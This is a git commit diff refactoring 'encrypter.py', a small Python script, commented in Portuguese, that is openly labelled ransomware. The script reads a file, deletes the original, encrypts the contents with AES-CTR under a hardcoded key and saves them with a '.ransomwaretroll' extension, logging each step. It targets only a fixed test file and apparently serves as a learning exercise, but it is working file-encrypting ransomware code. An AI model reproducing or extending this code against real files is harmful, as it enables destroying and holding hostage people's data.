d972546bba0c9e9884a799dac8b9b7ff0f95f949
foxz1n <148496806+foxzinnx@users.noreply.github.com>
2024-12-05 23:27:29 -0300

    Update encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,51 @@
 import os
 import pyaes
+import logging
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
 
-## remover o arquivo
-os.remove(file_name)
+logging.basicConfig(filename='ransomware.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-## chave de criptografia
+def encrypt_file(file_name, key):
+    try:
+        
+        if not os.path.isfile(file_name):
+            logging.error(f"Arquivo {file_name} não encontrado.")
+            return False
+
+        
+        with open(file_name, "rb") as file:
+            file_data = file.read()
+
+        
+        os.remove(file_name)
+        logging.info(f"Arquivo {file_name} removido com sucesso.")
+
+        
+        aes = pyaes.AESModeOfOperationCTR(key)
+
+        
+        crypto_data = aes.encrypt(file_data)
+
+        
+        new_file = file_name + ".ransomwaretroll"
+        with open(new_file, "wb") as encrypted_file:
+            encrypted_file.write(crypto_data)
+        
+        logging.info(f"Arquivo criptografado salvo como {new_file}")
+        return True
+    
+    except Exception as e:
+        logging.error(f"Erro durante a criptografia do arquivo {file_name}: {e}")
+        return False
+
+
 key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+file_name = "teste.txt"
+
+
+if encrypt_file(file_name, key):
+    print(f"O arquivo {file_name} foi criptografado com sucesso.")
+else:
+    print(f"Erro ao criptografar o arquivo {file_name}.")
